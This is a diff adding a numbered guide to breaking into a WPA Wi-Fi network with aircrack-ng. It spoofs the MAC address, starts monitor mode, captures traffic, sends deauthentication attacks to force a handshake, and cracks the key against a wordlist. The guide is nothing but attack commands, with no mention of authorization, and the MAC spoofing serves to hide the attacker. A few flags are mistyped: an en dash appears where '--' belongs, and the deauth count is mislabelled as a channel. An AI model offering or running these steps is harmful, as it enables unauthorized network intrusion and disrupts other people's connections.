@@ -1,0 +1,27 @@
+1.  Change your mac address with macchanger.
+    --> $ sudo ifconfig wlan0 down
+    --> $ sudo macchanger -r wlan0
+    --> $ sudo ifconfig wlan0 up
+
+2.  Get the adapter name.
+    --> $ iwconfig
+
+3.  Close all processes that could interfer with the aircrack monitor mode.
+    --> $ sudo airmon-ng check kill
+
+4.  Enable the monitor mode on the adapter.
+    --> $ sudo airmon-ng start wlan0
+
+5.  Show all available access points.
+    --> $ sudo airodump-ng wlan0mon
+    --> Leave this terminal session open.
+
+6.  Capture data from access point.
+    --> $ sudo airodump-ng -c [channel] –bssid [BSSID] -w [path_to_write_data] wlan0mon
+
+7.  De-authenticate the connected clients from the access point.
+    --> $ sudo aireplay-ng –deauth [channel] -a [BSSID] wlan0mon
+    --> Look if the WPA handshake is now visible in the terminal session from 5
+
+8.  Cracking the wireless lan.
+    --> $ sudo aircrack-ng -b [bssid of router] [path to capture packets] -w [path to word list]
